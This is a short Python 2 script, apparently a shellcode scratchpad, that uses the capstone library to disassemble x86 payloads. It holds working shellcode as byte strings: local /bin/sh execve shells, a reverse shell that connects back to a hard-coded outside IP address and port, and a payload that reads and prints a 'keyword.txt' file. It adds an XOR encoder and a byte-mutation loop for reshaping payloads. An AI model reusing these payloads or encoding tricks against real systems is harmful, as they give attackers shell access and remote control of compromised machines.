__author__ = 'HuyNA'


import capstone

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68'
position_change = [0,1,2]

sc = "\x68\xc0\xf1\xb1\xad\x68\xff\x02\x1f\x91\x89\xe7\x31\xc0\x50"
sc+= "\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62"
sc+= "\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68"
sc+= "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50"
sc+= "\xb0\x3b\xcd\x80"

sc = '\x31\xD2\x31\xF6\x31\xFF\x31\xC0\x31\xC9\xB0\x0B\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x51\x89\xE2\x53\x89\xE1\xCD\x80'
'''
>>> 'keyw'.encode('hex')
'6b657977'
>>> 'ord.'.encode('hex')
'6f72642e'
>>> 'txt\x00'.encode('hex')
'74787400'
'''
read_file =   "\x31\xc9\xf7\xe1\xb0\x05\x51" \
              "\x68"+"txt\x00" \
              "\x68"+"ord." \
              "\x68"+"keyw" \
              "\x89\xe3\xcd\x80\x93\x91\xb0\x03"+\
              "\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92"+\
              "\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd"+\
              "\x80"

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0xFF)
    return decode_string

de = xor_encrypt(sc, '\xfb')
print de.encode('hex')

md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
for i in md.disasm(read_file, 0):
    print "0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str)

def change_byte(position):
    for i in range(256):
        print i
        t = chr(i)
        new_shell = shellcode[:position]+t+shellcode[position+1:]
        print new_shell.encode('hex')
        md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
        for i in md.disasm(new_shell, 0):
            print "0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str)


#for i in position_change: change_byte(i)


